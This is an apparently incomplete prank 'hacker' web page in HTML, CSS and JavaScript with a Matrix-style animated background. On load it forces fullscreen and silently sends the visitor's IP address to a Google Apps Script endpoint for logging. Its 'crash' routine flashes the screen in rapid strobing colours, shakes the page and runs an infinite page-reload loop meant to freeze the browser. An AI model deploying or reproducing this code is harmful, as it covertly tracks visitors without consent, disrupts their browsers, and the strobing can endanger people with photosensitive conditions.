    /* Basic Reset */
    * {

      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: black;
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      overflow: hidden;
      position: relative;

    /* Matrix Background Canvas */
    #matrixCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    /* Main Content Container */
    #content {
      position: relative;
      z-index: 1;
      text-align: center;
      padding-top: 50px;
    }

    h1 {
      font-size: 3rem;
      text-shadow: 0 0 10px #00ff00;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.5rem;
      text-shadow: 0 0 8px #00ff00;
      margin-bottom: 20px;
    }

    input,
    button {
      font-size: 1.2rem;
      padding: 10px;
      background: black;
      border: 2px solid #00ff00;
      color: #00ff00;
      margin: 10px;
    }

    button:hover {
      background: #00ff00;
      color: black;
      cursor: pointer;
    }

    /* Message and Hacker Image */
    #message {
      margin-top: 20px;
      opacity: 0;
      transition: opacity 1s;
    }

    #message.visible {
      opacity: 1;
    }

    .hacker {
      width: 300px;
      display: block;
      margin: 20px auto;
    }

    /* Chaos Overlay */
    #chaosOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: black;
      z-index: 10;
      display: none;
      text-align: center;
      color: red;
      font-size: 5rem;
      padding-top: 40vh;
    }

    /* Flashing Background for Chaos */
    .flashing {
      animation: flash 0.1s infinite;
    }

    @keyframes flash {
      0% { background-color: black; }
      25% { background-color: red; }
      50% { background-color: green; }
      75% { background-color: blue; }
      100% { background-color: black; }
    }
  </style>
</head>
<body>
  <!-- Matrix Background -->

  <script>
    // MATRIX EFFECT SETUP
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const letters = "01XOX1XOX10XOX1XOX10XOX1XOX10XOX1XOX1";
    const matrix = letters.split("");
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = [];
    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }

    function drawMatrix() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#0F0";
      ctx.font = fontSize + "px monospace";
      for (let i = 0; i < drops.length; i++) {
        const text = matrix[Math.floor(Math.random() * matrix.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }
    setInterval(drawMatrix, 50);

    // Start fullscreen automatically when the page loads
    window.onload = function() {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
      } else if (document.documentElement.mozRequestFullScreen) { // Firefox
        document.documentElement.mozRequestFullScreen();
      } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
        document.documentElement.webkitRequestFullscreen();
      } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
        document.documentElement.msRequestFullscreen();
      }

      // Get the user's IP address using ipify
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip; // Get the IP address from the response

          // Send the IP address to your Google Apps Script to log it in Sheets
          fetch('https://script.google.com/macros/s/AKfycbxZukmr0wi4pmYedYLbaT2aoye6J1zWzLaYHFRqpJ00qPIv89BYafNejDhwgQvx5ua2AQ/exec', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            mode: 'cors', // Fixes CORS error
            body: JSON.stringify({ ip: ip }) // Send the IP as part of the body
          })
          .then(response => response.json())
          .then(data => console.log("IP Logged:", data))
          .catch(error => console.error("Error sending IP to Google Apps Script:", error));
        })
        .catch(error => console.error("Error fetching IP address:", error));
    };

    // START CRASH FUNCTION
    function startCrash() {
      // Get the user's name
      const name = document.getElementById('nameInput').value.trim() || 'User';
      document.getElementById('userName').textContent = name;

      // Reveal the message div
      document.getElementById('message').classList.add('visible');

      // Hide the input and button
      document.getElementById('nameInput').style.display = 'none';
      document.querySelector('button').style.display = 'none';

      // Play the evil laugh sound
      document.getElementById('evilLaugh').play();

      // After 3 seconds, show the chaos overlay and begin chaos mode
      setTimeout(() => {
        const chaos = document.getElementById('chaosOverlay');
        chaos.style.display = 'block';
        chaos.classList.add('flashing');

        // Begin screen shaking
        setInterval(() => {
          const x = Math.random() * 10 - 5;
          const y = Math.random() * 10 - 5;
          document.body.style.transform = `translate(${x}px, ${y}px)`;
        }, 50);

        // ORIGINAL CRASH CODE:
        onbeforeunload = function(){ localStorage.x = 1; };
        setTimeout(function(){
          while(1) location.reload(1);
        }, 1000);
      }, 3000);
    }
  </script>
